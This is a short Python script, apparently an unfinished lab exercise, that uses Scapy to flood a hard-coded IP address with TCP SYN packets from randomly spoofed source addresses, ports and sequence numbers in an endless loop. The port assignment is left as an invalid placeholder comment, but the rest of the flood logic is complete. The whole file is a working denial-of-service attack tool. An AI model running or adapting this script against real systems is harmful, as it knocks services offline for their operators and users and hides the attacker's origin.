#!/bin/env python3
  
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

VM_IP = "153.90.6.209"
WebPagePort = // Need to choose which port

ip  = IP(dst=VM_IP)
tcp = TCP(dport=WebPagePort, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src    = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq   = getrandbits(32)
    send(pkt, verbose = 0)
